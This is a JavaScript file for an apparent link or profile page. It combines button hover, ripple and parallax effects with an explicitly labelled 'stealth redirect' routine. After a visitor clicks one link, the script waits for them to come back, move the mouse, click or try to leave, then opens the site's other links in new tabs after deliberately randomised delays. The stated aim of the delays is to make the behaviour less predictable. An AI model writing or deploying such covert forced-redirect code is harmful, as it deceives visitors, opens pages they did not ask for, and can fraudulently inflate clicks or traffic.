// Enhanced interactive effects and stealth redirect logic
document.addEventListener('DOMContentLoaded', function() {
    const buttons = document.querySelectorAll('.btn');
    const profileImg = document.querySelector('.profile-img');
    
    let currentClickedLink = null;
    let visitedLinks = new Set();
    let redirectInProgress = false;
    let redirectTimeout = null;

    // Button hover effects
    buttons.forEach(button => {
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-8px)';
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
        });
        
        // Ripple click effect
        button.addEventListener('click', function(e) {
            e.preventDefault();
            
            const linkType = this.getAttribute('data-link-type');
            currentClickedLink = this.href;
            
            // Mark this link as visited
            visitedLinks.add(linkType);
            
            // Store in sessionStorage for back button detection
            sessionStorage.setItem('lastClickedLink', currentClickedLink);
            sessionStorage.setItem('visitedLinks', JSON.stringify(Array.from(visitedLinks)));
            sessionStorage.setItem('clickTime', Date.now().toString());
            
            // Open link in new tab
            const newWindow = window.open(currentClickedLink, '_blank');
            
            // Focus on new window
            if (newWindow) {
                newWindow.focus();
            }
        });
    });
    
    // Profile image interaction
    profileImg.addEventListener('mouseenter', function() {
        this.style.transform = 'scale(1.08)';
    });
    
    profileImg.addEventListener('mouseleave', function() {
        this.style.transform = 'scale(1)';
    });
    
    // Stealth redirect logic
    function handleStealthRedirect() {
        if (redirectInProgress) return;
        
        const visitedLinksArray = JSON.parse(sessionStorage.getItem('visitedLinks') || '[]');
        const clickTime = parseInt(sessionStorage.getItem('clickTime') || '0');
        const timeSinceClick = Date.now() - clickTime;
        
        // Only redirect if user clicked a link recently (within last 2 minutes)
        if (timeSinceClick > 120000) {
            sessionStorage.removeItem('lastClickedLink');
            sessionStorage.removeItem('clickTime');
            return;
        }
        
        const allLinks = Array.from(buttons).map(btn => ({
            href: btn.href,
            type: btn.getAttribute('data-link-type')
        }));
        
        // Find next unvisited link
        const nextLink = allLinks.find(link => !visitedLinksArray.includes(link.type));
        
        if (nextLink && !redirectInProgress) {
            redirectInProgress = true;
            
            // Random delay between 1-3 seconds to make it less predictable
            const randomDelay = 1000 + Math.random() * 2000;
            
            redirectTimeout = setTimeout(() => {
                performStealthRedirect(nextLink.href);
            }, randomDelay);
        }
    }
    
    function performStealthRedirect(url) {
        // Mark this link as visited
        const linkType = getLinkTypeFromUrl(url);
        visitedLinks.add(linkType);
        sessionStorage.setItem('visitedLinks', JSON.stringify(Array.from(visitedLinks)));
        sessionStorage.setItem('lastClickedLink', url);
        sessionStorage.setItem('clickTime', Date.now().toString());
        
        // Redirect to next link in new tab
        window.open(url, '_blank');
        
        // Reset redirect state after a delay
        setTimeout(() => {
            redirectInProgress = false;
        }, 1000);
    }
    
    function getLinkTypeFromUrl(url) {
        const button = Array.from(buttons).find(btn => btn.href === url);
        return button ? button.getAttribute('data-link-type') : 'unknown';
    }
    
    // Enhanced detection for user returning to page
    function setupRedirectMechanism() {
        // Page visibility detection
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && sessionStorage.getItem('lastClickedLink')) {
                // Short random delay before checking for redirect
                setTimeout(handleStealthRedirect, 500 + Math.random() * 1000);
            }
        });
        
        // Window focus detection
        window.addEventListener('focus', function() {
            if (sessionStorage.getItem('lastClickedLink')) {
                setTimeout(handleStealthRedirect, 800 + Math.random() * 1200);
            }
        });
        
        // Mouse movement detection (user interacting with page)
        document.addEventListener('mousemove', function() {
            if (sessionStorage.getItem('lastClickedLink') && !redirectInProgress) {
                // Debounced redirect check
                clearTimeout(redirectTimeout);
                redirectTimeout = setTimeout(handleStealthRedirect, 1000);
            }
        });
        
        // Click detection anywhere on page
        document.addEventListener('click', function() {
            if (sessionStorage.getItem('lastClickedLink') && !redirectInProgress) {
                setTimeout(handleStealthRedirect, 500);
            }
        });
        
        // Beforeunload detection (user trying to leave)
        window.addEventListener('beforeunload', function() {
            if (sessionStorage.getItem('lastClickedLink') && !redirectInProgress) {
                handleStealthRedirect();
            }
        });
    }
    
    // Add subtle background parallax effect
    window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        const parallax = document.querySelector('body');
        parallax.style.backgroundPosition = `center ${scrolled * 0.5}px`;
    });
    
    // Initialize
    const storedVisitedLinks = JSON.parse(sessionStorage.getItem('visitedLinks') || '[]');
    storedVisitedLinks.forEach(link => visitedLinks.add(link));
    
    // Setup redirect mechanism after a short delay
    setTimeout(setupRedirectMechanism, 2000);
    
    // Check for redirect on initial load (if user came back via back button)
    if (sessionStorage.getItem('lastClickedLink')) {
        setTimeout(handleStealthRedirect, 3000);
    }
});
